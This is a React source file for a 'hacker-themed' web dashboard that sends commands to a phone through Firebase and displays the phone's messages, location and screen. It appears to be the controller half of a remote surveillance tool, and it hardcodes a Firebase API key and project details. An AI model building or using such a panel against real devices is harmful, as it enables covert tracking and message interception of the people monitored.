// src/App.js

import React, { useEffect, useState, useRef } from 'react';
import './index.css';
import firebase from 'firebase/compat/app';
import 'firebase/compat/database';

// Firebase config (replace with your actual values)
const firebaseConfig = {
  apiKey: "AIzaSyCB5iqCRZYKzdn4AkHhUemkx2kwEGMWp3k",
  authDomain: "phonecontrol-250208.firebaseapp.com",
  databaseURL: "https://phonecontrol-250208-default-rtdb.firebaseio.com",
  projectId: "phonecontrol-250208",
  storageBucket: "phonecontrol-250208.appspot.com",
  messagingSenderId: "428817953538",
  appId: "1:428817953538:web:c9e081e01a92c7e642881b"
};

firebase.initializeApp(firebaseConfig);

const commandRef = firebase.database().ref('/commands/device_001');
const messagesRef = firebase.database().ref('/messages/device_001');
const locationRef = firebase.database().ref('/location/device_001');

function App() {
  const [messages, setMessages] = useState([]);
  const [location, setLocation] = useState({ lat: '--', lon: '--' });
  const commandInputRef = useRef();

  useEffect(() => {
    // Listen for command changes
    commandRef.on('value', snapshot => {
      const cmd = snapshot.val();
      if (cmd) {
        setMessages(prev => [...prev, `Command received: ${JSON.stringify(cmd)}`]);
      }
    });

    // Listen for new messages
    messagesRef.on('child_added', snapshot => {
      const msg = snapshot.val();
      if (msg) {
        setMessages(prev => [...prev, `Message: ${msg}`]);
      }
    });

    // Listen for location updates
    locationRef.on('value', snapshot => {
      const loc = snapshot.val();
      if (loc && loc.lat && loc.lon) {
        setLocation({ lat: loc.lat, lon: loc.lon });
      }
    });

    // Cleanup on unmount
    return () => {
      commandRef.off();
      messagesRef.off();
      locationRef.off();
    };
  }, []);

  const sendCommand = () => {
    const cmd = commandInputRef.current.value.trim();
    if (!cmd) return;
    commandRef.set({ action: cmd, timestamp: Date.now() }).then(() => {
      setMessages(prev => [...prev, `Sent command: ${cmd}`]);
      commandInputRef.current.value = '';
    });
  };

  const forceOpenApp = () => {
    commandRef.set({ action: 'force_open', timestamp: Date.now() }).then(() => {
      setMessages(prev => [...prev, 'Sent command: FORCE OPEN APP']);
    });
  };

  return (
    <div id="container">
      <header>Hacker-Themed Mobile Control Dashboard</header>

      <div id="screen" className="box">
        <img id="liveScreen" src="placeholder.png" alt="Live Screen" />
      </div>

      <div id="controls">
        <div className="box">
          <div>Command:</div>
          <input id="commandInput" placeholder="Enter command..." ref={commandInputRef} />
          <button onClick={sendCommand}>Send</button>
          <button onClick={forceOpenApp}>Force Open App</button>
        </div>
        <div id="messages" className="box">
          <div><strong>Live Messages:</strong></div>
          <div style={{ maxHeight: '45vh', overflowY: 'auto', fontFamily: 'monospace' }}>
            {messages.map((m, i) => <div key={i}>{m}</div>)}
          </div>
        </div>
        <div id="location" className="box">
          <div><strong>Location:</strong></div>
          <div id="locationCoords">
            Lat: {location.lat}, Lon: {location.lon}
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
